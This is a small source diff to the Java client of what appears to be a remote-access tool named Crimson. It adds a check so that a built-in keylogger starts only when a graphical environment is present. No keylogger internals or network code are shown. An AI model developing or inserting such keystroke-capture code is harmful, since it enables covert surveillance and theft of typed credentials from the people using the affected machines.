@@ -17,6 +17,7 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client;
 
+import java.awt.GraphicsEnvironment;
 import java.io.File;
 
 import org.slf4j.Logger;
@@ -69,7 +70,7 @@ public class Client {
 
 		log.debug("CVID: {}", Common.cvid);
 
-		if (ic.getKeylogger()) {
+		if (ic.getKeylogger() && !GraphicsEnvironment.isHeadless()) {
 			// TODO set parameters
 			Keylogger.start(RefreshMethod.TIME, 20000);
 		}
